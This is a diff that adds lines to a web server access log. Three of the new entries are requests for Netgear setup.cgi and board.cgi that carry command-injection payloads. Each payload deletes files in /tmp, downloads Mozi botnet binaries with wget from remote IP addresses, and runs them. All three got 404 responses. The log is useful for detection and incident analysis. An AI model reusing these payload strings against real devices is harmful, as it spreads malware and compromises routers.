@@ -73508,3 +73508,9 @@ Run time of job "send_daily_summary (trigger: cron[hour='8', minute='0'], next r
 127.0.0.1 - - [11/May/2026 08:34:44] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.0" 200 -
 127.0.0.1 - - [11/May/2026 09:07:30] "[33mGET /actuator/gateway/routes HTTP/1.0[0m" 404 -
 127.0.0.1 - - [11/May/2026 09:16:16] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [11/May/2026 10:55:04] "GET /login HTTP/1.0" 200 -
+127.0.0.1 - - [11/May/2026 11:33:47] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.26.83.206:36887/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [11/May/2026 12:21:06] "[33mGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://103.26.86.117:56669/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0[0m" 404 -
+127.0.0.1 - - [11/May/2026 13:38:22] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://14.205.104.200:40529/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+127.0.0.1 - - [11/May/2026 13:51:58] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [11/May/2026 14:29:33] "GET /login HTTP/1.0" 200 -
